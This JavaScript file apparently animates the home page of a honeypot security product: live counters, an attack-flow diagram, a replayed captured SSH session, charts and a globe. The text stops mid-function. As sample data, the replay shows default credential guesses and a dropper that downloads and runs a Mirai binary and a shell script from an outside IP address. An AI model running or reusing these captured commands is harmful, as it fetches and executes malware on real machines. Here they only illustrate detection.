/* Home page motion: live figures from the public API, the attack flow, the card drawings,
   the globe, the five-scene "how it works" story, the session replay, the stats
   burst and the architecture drawing. Requires js/site.js first. With reduced motion
   (or no Motion), every figure is left in its final, readable state. */
(function () {
    'use strict';

    var S = window.STSite || {};
    var M = S.M;
    var EASE = S.EASE || [0.16, 1, 0.3, 1];
    var animated = !!S.canAnimate;
    var SVGNS = 'http://www.w3.org/2000/svg';

    var sleep = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
    var rand = function (a, b) { return a + Math.random() * (b - a); };
    var esc = function (s) {
        return String(s).replace(/[&<>"']/g, function (c) {
            return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
        });
    };
    // Motion cannot interpolate var(); read the resolved token color instead.
    function tok(el, name) {
        return getComputedStyle(el).getPropertyValue(name).trim();
    }
    function svgEl(tag, attrs, parent) {
        var el = document.createElementNS(SVGNS, tag);
        Object.keys(attrs || {}).forEach(function (k) { el.setAttribute(k, attrs[k]); });
        if (parent) parent.appendChild(el);
        return el;
    }
    // Move a circle along an SVG path while a value runs 0 to 1.
    function follow(path, dot, opts) {
        var len = path.getTotalLength();
        return M.animate(0, 1, {
            duration: opts.duration,
            delay: opts.delay || 0,
            ease: opts.ease || [0.45, 0, 0.2, 1],
            onUpdate: function (t) {
                var p = path.getPointAtLength(t * len);
                dot.setAttribute('cx', p.x);
                dot.setAttribute('cy', p.y);
                if (opts.draw) path.style.strokeDashoffset = String(1 - t);
            },
        });
    }
    // Run a loop only while its element is on screen. `body(alive)` should return
    // as soon as alive() turns false.
    function whileVisible(el, body, amount) {
        var gen = 0;
        M.inView(el, function () {
            var my = ++gen;
            body(function () { return my === gen; });
            return function () { gen++; };
        }, { amount: amount || 0.35 });
    }

    // Canvas helpers live in site.js, which also draws the hero ribbon on every public page.
    var C = S.canvas;
    var REDUCED = C.reduced, mix = C.mix, mixc = C.mixc, clamp01 = C.clamp01, easeOut = C.easeOut,
        rgba = C.rgba, seeded = C.seeded, stage = C.stage;

    /* ------------------------------------------------------------------
       Live figures: read from this deployment's public endpoints.
       Elements stay hidden if the backend does not answer.
       ------------------------------------------------------------------ */
    function initLive() {
        var wraps = document.querySelectorAll('[data-live-wrap]');
        var line = document.querySelector('[data-live-line]');
        if (!wraps.length && !line) return;
        var local = ['127.0.0.1', 'localhost'].indexOf(location.hostname) !== -1;
        var API = local ? 'http://127.0.0.1:8000/api/v1' : '/api/v1';
        var last = {};
        // Each digit is a column of 0 to 9 that rolls to its place (css: .odo-d).
        var roll = function (el, value) {
            var text = value.toLocaleString();
            if (el.getAttribute('aria-label') === text) return;
            el.setAttribute('aria-label', text);
            if (el.textContent.length !== text.length || !el.querySelector('.odo-d')) {
                el.textContent = '';
                text.split('').forEach(function (c) {
                    if (c < '0' || c > '9') { el.appendChild(document.createTextNode(c)); return; }
                    var d = document.createElement('span'), strip = document.createElement('i');
                    d.className = 'odo-d';
                    d.setAttribute('aria-hidden', 'true');
                    strip.textContent = '0\n1\n2\n3\n4\n5\n6\n7\n8\n9';
                    d.appendChild(strip);
                    el.appendChild(d);
                });
                void el.offsetWidth; // start from zero, then roll
            }
            var digits = text.replace(/[^0-9]/g, '');
            el.querySelectorAll('.odo-d > i').forEach(function (strip, i) { strip.style.setProperty('--d', digits[i]); });
        };
        var put = function (key, value) {
            last[key] = value;
            document.querySelectorAll('[data-live="' + key + '"]').forEach(function (el) {
                if (!animated) { el.textContent = value.toLocaleString(); return; }
                roll(el, value);
            });
        };
        function refresh() {
            return fetch(API + '/public/summary', { cache: 'no-store' }).then(function (r) {
                if (!r.ok) throw new Error(String(r.status));
                return r.json();
            }).then(function (sum) {
                var events = Number(sum.events_logged || 0);
                if (line && events > 0 && !line.querySelector('[data-live]')) {
                    line.innerHTML = 'Events logged on this deployment: <span class="num" data-live="events">0</span>';
                }
                put('events', events);
                put('attackers', Number(sum.unique_attackers || 0));
                wraps.forEach(function (w) {
                    if (!w.hidden) return;
                    w.hidden = false;
                    if (animated) M.animate(w, { opacity: [0, 1] }, { duration: 0.5 });
                });
            });
        }
        refresh().then(function () {
            // Keep the figures current while the page stays open.
            setInterval(function () {
                if (!document.hidden) refresh().catch(function () {});
            }, 4000);
        }).catch(function () { /* backend offline: keep the static copy */ });
    }

    /* ------------------------------------------------------------------
       Fig. 1: probes, decoys, collector, event stream, case
       ------------------------------------------------------------------ */
    function initFlow() {
        var svg = document.getElementById('flowSvg');
        if (!svg) return;
        var sourcesG = document.getElementById('flowSources');
        var packetsG = document.getElementById('flowPackets');
        var stream = document.getElementById('flowStream');
        var caseEl = document.getElementById('flowCase');
        var pulse = document.getElementById('collectorPulse');
        var decoys = svg.querySelectorAll('.decoy');
        var wires = svg.querySelectorAll('.wire');

        var SOURCES = ['203.0.113.24', '198.51.100.7', '192.0.2.61', '203.0.113.80', '198.51.100.42'];
        var SRC_Y = [62, 127, 192, 257, 322];
        var DECOY_Y = [82, 192, 302];

        SOURCES.forEach(function (ip, i) {
            svgEl('circle', { class: 'src-dot', cx: 128, cy: SRC_Y[i], r: 4.5 }, sourcesG);
            var t = svgEl('text', { class: 'src-label', x: 114, y: SRC_Y[i] + 4, 'text-anchor': 'end' }, sourcesG);
            t.textContent = ip;
        });

        // Captured values; addresses swapped for documentation ranges.
        var EVENTS = [
            { s: 0, d: 0, ev: 'login.failed', det: 'root / 123456', tech: 'T1110' },
            { s: 2, d: 1, ev: 'smb connect', det: 'port 445', tech: 'T1595' },
            { s: 1, d: 0, ev: 'login.failed', det: 'admin / admin', tech: 'T1110' },
            { s: 3, d: 2, ev: 'http request', det: 'GET / on 8022', tech: 'T1190' },
            { s: 1, d: 0, ev: 'login.failed', det: 'root / toor', tech: 'T1110' },
            { s: 1, d: 0, ev: 'login.success', det: 'oracle / oracle', tech: 'T1110' },
            { s: 4, d: 1, ev: 'ftp connect', det: 'port 2121', tech: 'T1110' },
            { s: 1, d: 0, ev: 'command', det: 'whoami; id; uname -a', tech: 'T1059' },
            { s: 1, d: 0, ev: 'file_download', det: '…/bins/mirai.arm7', tech: 'T1105' },
        ];

        function clock() {
            var d = new Date();
            return d.toTimeString().slice(0, 8);
        }

        function pushEvent(e) {
            var li = document.createElement('li');
            li.innerHTML = '<span class="t">' + clock() + '</span>'
                + '<span class="ev"><b>' + esc(e.ev) + '</b><span>' + esc(SOURCES[e.s]) + ' · ' + esc(e.det) + '</span></span>'
                + '<span class="tech">' + esc(e.tech) + '</span>';
            stream.insertBefore(li, stream.firstChild);
            while (stream.children.length > 6) stream.removeChild(stream.lastChild);
            if (animated) M.animate(li, { opacity: [0, 1], x: [-10, 0] }, { duration: 0.5, ease: EASE });
        }

        if (!animated) {
            EVENTS.slice(-6).forEach(pushEvent);
            caseEl.style.opacity = '1';
            return;
        }

        var running = false;
        var gen = 0;

        async function fire(e, myGen) {
            var sy = SRC_Y[e.s];
            var dy = DECOY_Y[e.d];
            var path = svgEl('path', {
                class: 'probe-path',
                d: 'M128 ' + sy + ' C 166 ' + sy + ', 152 ' + dy + ', 184 ' + dy,
                pathLength: 1,
            }, packetsG);
            path.style.strokeDasharray = '1';
            path.style.strokeDashoffset = '1';
            var dot = svgEl('circle', { class: 'probe', r: 4, cx: 128, cy: sy }, packetsG);
            await follow(path, dot, { duration: 0.85, draw: true });
            if (myGen !== gen) { path.remove(); dot.remove(); return; }

            var decoy = decoys[e.d];
            decoy.classList.add('hit');
            setTimeout(function () { decoy.classList.remove('hit'); }, 700);
            dot.remove();
            M.animate(path, { opacity: [1, 0] }, { duration: 0.8 }).then(function () { path.remove(); });

            var rec = svgEl('circle', { class: 'record', r: 3.5 }, packetsG);
            await follow(wires[e.d], rec, { duration: 0.6, ease: [0.4, 0, 0.2, 1] });
            rec.remove();
            if (myGen !== gen) return;
            M.animate(pulse, { scale: [1, 1.7], opacity: [0.7, 0] }, { duration: 0.7, ease: 'easeOut' });
            pushEvent(e);
        }

        async function loop() {
            var myGen = ++gen;
            while (running && myGen === gen) {
                caseEl.style.opacity = '0';
                for (var i = 0; i < EVENTS.length; i++) {
                    if (!running || myGen !== gen) return;
                    fire(EVENTS[i], myGen);
                    await sleep(1050);
                }
                await sleep(1500);
                if (!running || myGen !== gen) return;
                await M.animate(caseEl, { opacity: [0, 1], y: [14, 0] }, { duration: 0.7, ease: EASE });
                await sleep(3800);
                if (!running || myGen !== gen) return;
                await M.animate([caseEl].concat(Array.prototype.slice.call(stream.children)), { opacity: 0 }, { duration: 0.5 });
                stream.innerHTML = '';
                await sleep(500);
            }
        }

        M.inView(svg, function () {
            running = true;
            loop();
            return function () { running = false; gen++; };
        }, { amount: 0.2 });
    }

    /* ------------------------------------------------------------------
       Card drawings: each one loops while it is on screen
       ------------------------------------------------------------------ */
    function initTiles() {
        if (!animated) return; // markup already shows each drawing's finished state

        // A detection rule is read top to bottom, then fires.
        var rule = document.querySelector('[data-art="rule"]');
        if (rule) {
            var lines = rule.querySelectorAll('.ln');
            var fired = rule.querySelector('[data-fired]');
            fired.style.opacity = '0';
            whileVisible(rule, async function (alive) {
                while (alive()) {
                    for (var i = 0; i < lines.length; i++) {
                        lines.forEach(function (l, k) { l.classList.toggle('hot', k === i); });
                        await sleep(340);
                        if (!alive()) return;
                    }
                    lines.forEach(function (l) { l.classList.remove('hot'); });
                    M.animate(fired, { opacity: [0, 1], scale: [0.7, 1] }, { type: 'spring', stiffness: 460, damping: 20 });
                    await sleep(2600);
                    if (!alive()) return;
                    await M.animate(fired, { opacity: 0 }, { duration: 0.3 });
                    await sleep(500);
                }
            });
        }

        // Techniques light up in the matrix as they are seen.
        var matrix = document.querySelector('[data-art="matrix"]');
        if (matrix) {
            var cells = Array.prototype.slice.call(matrix.querySelectorAll('.art-matrix i'));
            var label = matrix.querySelector('[data-tech]');
            var TECHS = [
                ['T1595', 'Active Scanning'],
                ['T1046', 'Network Service Discovery'],
                ['T1110', 'Brute Force'],
                ['T1190', 'Exploit Public-Facing Application'],
                ['T1059', 'Command and Scripting Interpreter'],
                ['T1105', 'Ingress Tool Transfer'],
            ];
            whileVisible(matrix, async function (alive) {
                while (alive()) {
                    cells.forEach(function (c) { c.className = ''; });
                    var free = cells.slice();
                    for (var i = 0; i < 12; i++) {
                        var cell = free.splice(Math.floor(Math.random() * free.length), 1)[0];
                        var tech = TECHS[i % TECHS.length];
                        cell.className = 'hot';
                        label.innerHTML = '<b>' + tech[0] + '</b>' + esc(tech[1]);
                        M.animate(cell, { scale: [0.6, 1] }, { type: 'spring', stiffness: 520, damping: 18 });
                        M.animate(label, { opacity: [0, 1], y: [5, 0] }, { duration: 0.3 });
                        await sleep(820);
                        if (!alive()) return;
                        cell.className = 'on';
                    }
                    await sleep(1400);
                }
            });
        }
    }

    /* ------------------------------------------------------------------
       Fig. 2: sticky story with five scenes
       ------------------------------------------------------------------ */
    function initStory() {
        var story = document.querySelector('[data-story]');
        if (!story) return;
        var scenes = story.querySelectorAll('.scene');
        var steps = story.querySelectorAll('.step');
        var label = story.querySelector('[data-stage-label]');
        var dots = story.querySelectorAll('[data-stage-dots] i');
        var NAMES = ['01 · Deceive', '02 · Capture', '03 · Enrich', '04 · Correlate', '05 · Respond'];
        var active = -1;
        var stopScene = null;

        // Scene 1: probes keep arriving at the three decoys.
        function sceneDeceive(root) {
            var g = root.querySelector('[data-s1-probes]');
            var ports = root.querySelectorAll('.port');
            var PORT_Y = [84, 220, 356];
            var on = true;
            (async function () {
                while (on) {
                    var d = Math.floor(Math.random() * 3);
                    var y0 = rand(40, 400);
                    var y1 = PORT_Y[d];
                    var path = svgEl('path', { class: 'signal-line', d: 'M10 ' + y0 + ' C 140 ' + y0 + ', 120 ' + y1 + ', 245 ' + y1, pathLength: 1 }, g);
                    path.style.strokeDasharray = '1';
                    path.style.strokeDashoffset = '1';
                    var dot = svgEl('circle', { class: 'signal', r: 3.5, cx: 10, cy: y0 }, g);
                    follow(path, dot, { duration: 0.9, draw: true }).then(function (p, dt, port) {
                        return function () {
                            dt.remove();
                            M.animate(port, { fill: [tok(port, '--st-danger'), tok(port, '--st-surface')] }, { duration: 0.9 });
                            M.animate(p, { opacity: [1, 0] }, { duration: 0.8 }).then(function () { p.remove(); });
                        };
                    }(path, dot, ports[d]));
                    await sleep(rand(260, 520));
                }
            })();
            return function () { on = false; g.innerHTML = ''; };
        }

        // Scene 2: JSON lines scroll through, rows land in the database.
        var JSON_LINES = [
            [['eventid', 'cowrie.login.failed'], ['username', 'root'], ['password', '123456']],
            [['eventid', 'cowrie.session.connect'], ['src_port', '50122'], ['dst_port', '2222']],
            [['connection', 'smbd'], ['local_port', '445'], ['remote_ip', '192.0.2.61']],
            [['eventid', 'cowrie.command.input'], ['input', 'uname -a']],
            [['sensor', 'honeytrap'], ['category', 'heartbeat'], ['type', 'info']],
            [['eventid', 'cowrie.login.success'], ['username', 'oracle'], ['password', 'oracle']],
            [['eventid', 'cowrie.session.file_download'], ['url', 'http://45.9.148.99/w.sh']],
            [['connection', 'ftpd'], ['local_port', '21'], ['remote_ip', '203.0.113.80']],
            [['eventid', 'cowrie.client.version'], ['version', 'SSH-2.0-OpenSSH_9.6']],
        ];
        function sceneCapture(root) {
            var tail = root.querySelector('[data-json-tail]');
            var rows = root.querySelectorAll('[data-db-rows] line');
            var sse = root.querySelectorAll('[data-sse]');
            var on = true;
            var n = 0;
            tail.innerHTML = '';
            rows.forEach(function (r) { r.style.stroke = ''; });
            (async function () {
                while (on) {
                    var parts = JSON_LINES[n % JSON_LINES.length];
                    var div = document.createElement('div');
                    div.innerHTML = '{' + parts.map(function (kv) {
                        return '<span class="k">"' + esc(kv[0]) + '":</span><span class="s">"' + esc(kv[1]) + '"</span>';
                    }).join(', ') + '}';
                    tail.appendChild(div);
                    M.animate(div, { opacity: [0, 1], x: [-8, 0] }, { duration: 0.4 });
                    while (tail.children.length > 14) tail.removeChild(tail.firstChild);
                    var row = rows[n % rows.length];
                    M.animate(row, { stroke: [tok(row, '--st-accent'), tok(row, '--st-border-strong')] }, { duration: 0.9 });
                    if (n % 2 === 0) M.animate(sse, { opacity: [1, 0.25, 1] }, { duration: 0.6 });
                    n++;
                    await sleep(520);
                }
            })();
            return function () { on = false; };
        }

        // Scene 3: context tags attach to the record.
        function sceneEnrich(root) {
            var card = root.querySelector('.record-card');
            var tags = root.querySelectorAll('[data-tags] .tag');
            M.animate(card, { opacity: [0, 1], y: ['-46%', '-50%'], x: ['-50%', '-50%'] }, { duration: 0.6, ease: EASE });
            tags.forEach(function (t, i) {
                var a = (i / tags.length) * Math.PI * 2;
                M.animate(t, {
                    opacity: [0, 1],
                    x: [Math.cos(a) * 140, 0],
                    y: [Math.sin(a) * 110, 0],
                    scale: [0.85, 1],
                }, { duration: 0.9, delay: 0.35 + i * 0.14, ease: EASE });
            });
            return function () {};
        }

        // Scene 4: scattered events line up, then collapse into one incident.
        function sceneCorrelate(root) {
            var items = root.querySelectorAll('[data-tl] .tl-item');
            var line = root.querySelector('[data-tl-line]');
            var sheet = root.querySelector('[data-case]');
            items.forEach(function (it, i) {
                M.animate(it, {
                    opacity: [0, 1],
                    x: [rand(-30, 160), 0],
                    y: [rand(-50, 50), 0],
                    rotate: [rand(-8, 8), 0],
                }, { duration: 1, delay: 0.1 + i * 0.07, ease: EASE });
            });
            M.animate(line, { scaleY: [0, 1] }, { duration: 1.1, delay: 0.5, ease: EASE });
            M.animate(sheet, { opacity: [0, 1], x: [40, 0], y: ['-50%', '-50%'] }, { duration: 0.8, delay: 1.3, ease: EASE });
            return function () {};
        }

        // Scene 5: a report writes itself, controls tick off.
        function sceneRespond(root) {
            var sheet = root.querySelector('[data-report]');
            var bars = sheet.querySelectorAll('.bar');
            var cols = sheet.querySelectorAll('.chart i');
            var lis = root.querySelectorAll('[data-controls] li');
            var ticks = root.querySelectorAll('[data-controls] .tick path');
            M.animate(sheet, { opacity: [0, 1], y: [30, 0], rotate: [-2, 0] }, { duration: 0.8, ease: EASE });
            M.animate(bars, { scaleX: [0, 1] }, { duration: 0.6, delay: M.stagger(0.07, { startDelay: 0.4 }), ease: EASE });
            M.animate(cols, { scaleY: [0, 1] }, { duration: 0.7, delay: M.stagger(0.06, { startDelay: 0.7 }), ease: EASE });
            M.animate(lis, { opacity: [0, 1], x: [16, 0] }, { duration: 0.5, delay: M.stagger(0.18, { startDelay: 0.9 }), ease: EASE });
            ticks.forEach(function (p) { p.style.strokeDasharray = '1'; });
            M.animate(ticks, { strokeDashoffset: [1, 0] }, { duration: 0.45, delay: M.stagger(0.18, { startDelay: 1.15 }) });
            return function () {};
        }

        var ENTER = [sceneDeceive, sceneCapture, sceneEnrich, sceneCorrelate, sceneRespond];

        function setActive(i) {
            if (i === active) return;
            var prev = active;
            active = i;
            steps.forEach(function (s, k) { s.classList.toggle('is-active', k === i); });
            dots.forEach(function (d, k) { d.classList.toggle('on', k === i); });
            if (label) label.textContent = NAMES[i];
            if (stopScene) { stopScene(); stopScene = null; }
            if (!animated) {
                scenes.forEach(function (sc, k) {
                    sc.classList.toggle('is-active', k === i);
                    sc.style.opacity = k === i ? '1' : '0';
                });
                return;
            }
            if (prev >= 0) {
                var old = scenes[prev];
                M.animate(old, { opacity: 0, y: -12 }, { duration: 0.35, ease: 'easeIn' }).then(function () {
                    if (active !== prev) old.classList.remove('is-active');
                });
            }
            var next = scenes[i];
            next.classList.add('is-active');
            M.animate(next, { opacity: [0, 1], y: [14, 0] }, { duration: 0.6, delay: prev >= 0 ? 0.2 : 0, ease: EASE });
            stopScene = ENTER[i](next);
        }

        if (!animated) {
            // Static fallback: show the final state of each scene as its step is read.
            setActive(0);
            if ('IntersectionObserver' in window) {
                var io = new IntersectionObserver(function (entries) {
                    entries.forEach(function (en) {
                        if (en.isIntersecting) setActive(+en.target.getAttribute('data-step'));
                    });
                }, { rootMargin: '-45% 0px -45% 0px' });
                steps.forEach(function (s) { io.observe(s); });
            }
            return;
        }

        steps.forEach(function (s) {
            M.inView(s, function () { setActive(+s.getAttribute('data-step')); }, { margin: '-45% 0px -45% 0px' });
        });
        setActive(0);
    }

    /* ------------------------------------------------------------------
       Session replay: captured Cowrie session typed out with notes
       ------------------------------------------------------------------ */
    function initReplay() {
        var body = document.querySelector('[data-term-body]');
        if (!body) return;
        var notes = document.querySelectorAll('[data-note]');
        var btn = document.querySelector('[data-replay]');
        var LINES = [
            { ts: '19:11:37', k: 'sys', tx: 'connect 172.18.0.5 → :2222  SSH-2.0-OpenSSH_9.6' },
            { ts: '19:11:37', k: 'sys', tx: 'login.success  oracle / oracle', note: 0 },
            { ts: '19:11:37', k: 'cmd', tx: 'busybox; cat /proc/mounts; cat /proc/cpuinfo | grep -c processor;', note: 1 },
            { ts: '19:11:37', k: 'cmd', tx: 'cd /tmp; wget http://45.9.148.99/bins/mirai.arm7 -O .x; chmod +x .x; ./.x;', note: 2 },
            { ts: '19:11:37', k: 'alert', tx: 'file_download  http://45.9.148.99/bins/mirai.arm7' },
            { ts: '19:11:38', k: 'cmd', tx: 'curl http://45.9.148.99/w.sh | sh; rm -rf /tmp/.x' },
            { ts: '19:11:38', k: 'alert', tx: 'file_download  http://45.9.148.99/w.sh' },
            { ts: '19:11:38', k: 'sys', tx: 'detection st-exec-004 matched · incident opened · severity HIGH', note: 3 },
            { ts: '19:11:48', k: 'sys', tx: 'session closed after 11 s' },
        ];
        var gen = 0;

        function render(line) {
            var row = document.createElement('div');
            row.className = 'term-line ' + line.k;
            row.innerHTML = '<span class="ts">' + line.ts + '</span><span class="tx"></span>';
            body.appendChild(row);
            return row;
        }

        function showAll() {
            body.innerHTML = '';
            LINES.forEach(function (l) {
                var r = render(l);
                r.style.opacity = '1';
                r.querySelector('.tx').textContent = l.tx;
            });
            notes.forEach(function (n) { n.classList.add('on'); });
        }

        if (!animated) { showAll(); return; }

        async function play() {
            var my = ++gen;
            body.innerHTML = '';
            notes.forEach(function (n) { n.classList.remove('on'); });
            for (var i = 0; i < LINES.length; i++) {
                if (my !== gen) return;
                var l = LINES[i];
                var row = render(l);
                var tx = row.querySelector('.tx');
                M.animate(row, { opacity: [0, 1] }, { duration: 0.25 });
                if (l.k === 'cmd') {
                    var caret = document.createElement('span');
                    caret.className = 'caret';
                    for (var c = 1; c <= l.tx.length; c++) {
                        if (my !== gen) return;
                        tx.textContent = l.tx.slice(0, c);
                        tx.appendChild(caret);
                        await sleep(l.tx.charAt(c - 1) === ' ' ? 34 : 17);
                    }
                    caret.remove();
                } else {
                    tx.textContent = l.tx;
                }
                if (l.note != null) notes[l.note].classList.add('on');
                await sleep(l.k === 'cmd' ? 420 : 560);
            }
        }

        var played = false;
        M.inView(body, function () {
            if (!played) { played = true; play(); }
        }, { amount: 0.3 });
        if (btn) btn.addEventListener('click', play);
    }

    /* ------------------------------------------------------------------
       Architecture: edges draw themselves, then data keeps moving along them
       ------------------------------------------------------------------ */
    function initArch() {
        var fig = document.querySelector('[data-arch]');
        if (!fig || !animated) return;
        var edges = fig.querySelectorAll('[data-draw]');
        var nodes = fig.querySelectorAll('.node, .group, .t-group, text');
        var layer = fig.querySelector('[data-arch-packets]');
        edges.forEach(function (p) {
            p.dataset.marker = p.getAttribute('marker-end') || '';
            p.removeAttribute('marker-end');
            p.setAttribute('pathLength', '1');
            p.style.strokeDasharray = '1';
            p.style.strokeDashoffset = '1';
        });
        nodes.forEach(function (n) { n.style.opacity = '0'; });

        var drawn = false;
        M.inView(fig, function () {
            if (drawn) return;
            drawn = true;
            M.animate(nodes, { opacity: [0, 1] }, { duration: 0.6, delay: M.stagger(0.012) });
            edges.forEach(function (p, i) {
                M.animate(p, { strokeDashoffset: [1, 0] }, { duration: 0.9, delay: 0.5 + i * 0.12, ease: [0.65, 0, 0.35, 1] })
                    .then(function () { if (p.dataset.marker) p.setAttribute('marker-end', p.dataset.marker); });
            });
        }, { amount: 0.3 });

        // One wave of packets follows the path an event takes through the stack.
        if (!layer) return;
        whileVisible(fig, async function (alive) {
            await sleep(2400);
            while (alive()) {
                edges.forEach(function (p) {
                    var wave = +p.getAttribute('data-wave') || 0;
                    var dot = svgEl('circle', { class: 'packet' + (p.classList.contains('sig') ? ' sig' : ''), r: 4, opacity: 0 }, layer);
                    M.animate(dot, { opacity: [0, 1, 1, 0] }, { duration: 0.75, delay: wave * 0.6, times: [0, 0.15, 0.85, 1] });
                    follow(p, dot, { duration: 0.75, delay: wave * 0.6, ease: [0.4, 0, 0.2, 1] }).then(function () { dot.remove(); });
                });
                await sleep(5200);
            }
            layer.innerHTML = '';
        }, 0.3);
    }

    /* ------------------------------------------------------------------
       Replay banner: a bundle of fine strands along the lower edge
       ------------------------------------------------------------------ */
    function initStrands() {
        var cv = document.querySelector('[data-strands]');
        if (!cv || !cv.getContext) return;
        var BLUE = [74, 140, 255], VIOLET = [127, 125, 252], PINK = [244, 75, 204];
        stage(cv, function (ctx, w, h, t) {
            var n = 46;
            ctx.lineWidth = 1;
            for (var i = 0; i < n; i++) {
                var u = i / (n - 1);
                var c = u < 0.5 ? mixc(BLUE, VIOLET, u * 2) : mixc(VIOLET, PINK, u * 2 - 1);
                var g = ctx.createLinearGradient(0, 0, w, 0);
                g.addColorStop(0, rgba(c, 0));
                g.addColorStop(0.3, rgba(c, 0.22));
                g.addColorStop(1, rgba(c, 0.62));
                ctx.strokeStyle = g;
                ctx.beginPath();
                for (var x = 0; x <= w + 14; x += 14) {
                    var p = x / w;
                    var spread = 0.07 + 0.2 * Math.abs(Math.sin(p * 2.6 + t * 0.16 + 0.6));
                    var y = h * (1.02 - 0.3 * p * p)
                        + (u - 0.5) * h * spread
                        + Math.sin(p * 4.4 + u * 2.8 + t * 0.32) * h * 0.014;
                    if (x) ctx.lineTo(x, y); else ctx.moveTo(x, y);
                }
                ctx.stroke();
            }
        });
    }

    /* ------------------------------------------------------------------
       Numbers: the four figures take turns; a burst of rays changes colour with them
       ------------------------------------------------------------------ */
    function initBurst() {
        var cv = document.querySelector('[data-burst]');
        var wrap = document.querySelector('[data-stats]');
        if (!cv || !cv.getContext || !wrap) return;
        var stats = Array.prototype.slice.call(wrap.querySelectorAll('.stat'));
        var THEMES = [
            { tip: [64, 50, 221], mid: [74, 140, 255], core: [255, 172, 56], halo: [176, 205, 255] },
            { tip: [176, 28, 120], mid: [244, 75, 204], core: [255, 150, 60], halo: [255, 214, 236] },
            { tip: [214, 60, 20], mid: [255, 150, 40], core: [244, 75, 204], halo: [255, 226, 205] },
            { tip: [46, 43, 140], mid: [127, 125, 252], core: [255, 104, 150], halo: [214, 217, 252] },
        ];
        var KEYS = ['tip', 'mid', 'core', 'halo'];
        var rnd = seeded(7);
        var RAYS = [];
        var COUNT = 190;
        for (var i = 0; i < COUNT; i++) {
            var a = Math.PI * (1.012 + 0.976 * ((i + rnd()) / COUNT));
            RAYS.push({
                cos: Math.cos(a), sin: Math.sin(a),
                len: 0.26 + 0.74 * Math.pow(rnd(), 0.62),
                w: 0.5 + rnd() * 0.8,
                ph: rnd() * 6.2832, sp: 0.35 + rnd() * 0.8,
                dot: rnd() < 0.74 ? 1.1 + rnd() * 1.5 : 0,
                bucket: Math.min(3, Math.floor(Math.abs(Math.cos(a)) * 4)),
            });
        }

        var from = THEMES[0], to = THEMES[0], t0 = -10, born = REDUCED ? -10 : null;
        var now = function () { return performance.now() / 1000; };
        function colours(t) {
            var k = REDUCED ? 1 : easeOut((t - t0) / 0.9);
            var out = {};
            KEYS.forEach(function (key) { out[key] = mixc(from[key], to[key], k); });
            return out;
        }

        var view = stage(cv, function (ctx, w, h, t) {
            var ox = w / 2, oy = h + 2;
            var rx = Math.min(w * 0.37, 560), ry = h * 0.9;
            var c = colours(t);
            var grow = born == null ? 0.25 : REDUCED ? 1 : 0.25 + 0.75 * easeOut((t - born) / 1.7);
            var dip = REDUCED ? 1 : 1 - 0.1 * (1 - easeOut((t - t0) / 0.8));
            var g, b;

            // wide halo
            var sy = (h * 1.2) / (w * 0.5);
            ctx.save();
            ctx.translate(ox, oy);
            ctx.scale(1, sy);
            g = ctx.createRadialGradient(0, 0, 0, 0, 0, w * 0.5);
            g.addColorStop(0, rgba(c.halo, 0.95));
            g.addColorStop(0.5, rgba(c.halo, 0.6));
            g.addColorStop(1, rgba(c.halo, 0));
            ctx.fillStyle = g;
            ctx.fillRect(-w / 2, -oy / sy, w, oy / sy);
            ctx.restore();

            // warm core
            ctx.save();
            ctx.translate(ox, oy);
            ctx.scale(1, ry / rx);
            g = ctx.createRadialGradient(0, 0, 0, 0, 0, rx * 0.86 * grow);
            // pass through a pale warm tone on the way out, so the core never greys the halo
            g.addColorStop(0, rgba(c.core, 0.96));
            g.addColorStop(0.36, rgba(mixc(c.core, [255, 226, 205], 0.45), 0.7));
            g.addColorStop(0.7, rgba(mixc(c.core, c.halo, 0.8), 0.4));
            g.addColorStop(1, rgba(c.halo, 0));
            ctx.fillStyle = g;
            ctx.fillRect(-rx, -rx, rx * 2, rx);
            ctx.restore();

            var strokes = [], fills = [];
            for (b = 0; b < 4; b++) {
                var col = mixc(c.mid, c.tip, b / 3);
                g = ctx.createRadialGradient(ox, oy, 0, ox, oy, Math.max(rx, ry));
                g.addColorStop(0, rgba(col, 0));
                g.addColorStop(0.14, rgba(col, 0.2));
                g.addColorStop(0.62, rgba(col, 0.85));
                g.addColorStop(1, rgba(col, 1));
                strokes.push(g);
                fills.push(rgba(col, 0.95));
            }
            for (var i = 0; i < RAYS.length; i++) {
                var r = RAYS[i];
                var env = 1 / Math.sqrt((r.cos * r.cos) / (rx * rx) + (r.sin * r.sin) / (ry * ry));
                var len = env * r.len * grow * dip * (1 + 0.05 * Math.sin(t * r.sp + r.ph));
                var x = ox + r.cos * len, y = oy + r.sin * len;
                ctx.strokeStyle = strokes[r.bucket];
                ctx.lineWidth = r.w;
                ctx.beginPath();
                ctx.moveTo(ox, oy);
                ctx.lineTo(x, y);
                ctx.stroke();
                if (r.dot) {
                    ctx.fillStyle = fills[r.bucket];
                    ctx.beginPath();
                    ctx.arc(x, y, r.dot, 0, 6.2832);
                    ctx.fill();
                }
            }
        });

        var active = 0, timer = 0;
        function show(i) {
            var t = now();
            from = colours(t);
            to = THEMES[i % THEMES.length];
            t0 = t;
            active = i;
            stats.forEach(function (s, k) {
                s.classList.toggle('is-active', k === i);
                s.setAttribute('aria-pressed', k === i ? 'true' : 'false');
            });
            if (REDUCED) view.paint();
        }
        function run() {
            clearInterval(timer);
            if (REDUCED || stats.length < 2) return;
            timer = setInterval(function () { show((active + 1) % stats.length); }, 5000);
        }
        stats.forEach(function (s, i) {
            s.setAttribute('aria-pressed', i === 0 ? 'true' : 'false');
            s.addEventListener('click', function () { show(i); run(); });
        });
        if (REDUCED || !('IntersectionObserver' in window)) return;
        new IntersectionObserver(function (entries) {
            clearInterval(timer);
            if (!entries[entries.length - 1].isIntersecting) return;
            // restart the progress line so it stays in step with the timer
            var el = stats[active];
            if (el) { el.classList.remove('is-active'); void el.offsetWidth; el.classList.add('is-active'); }
            run();
        }, { threshold: 0.4 }).observe(wrap);
        new IntersectionObserver(function (entries, io) {
            if (!entries[entries.length - 1].isIntersecting) return;
            born = now();
            io.disconnect();
        }, { threshold: 0.3 }).observe(cv);
    }

    /* ------------------------------------------------------------------
       Globe: land drawn as dots, with probes arcing in to one sensor.
       LAND is a 2-degree land mask (180 x 90 bits, row-major from 90N 180W) rasterised
       from Natural Earth 1:110m land, which is public domain.
       ------------------------------------------------------------------ */
    var LAND = window.STGlobe.LAND; // shared with the console globe (js/globe.js)
    function initGlobe() {
        var cv = document.querySelector('[data-globe]');
        if (!cv || !cv.getContext) return;
        var bits = atob(LAND);
        var RAD = Math.PI / 180;
        function land(lat, lon) {
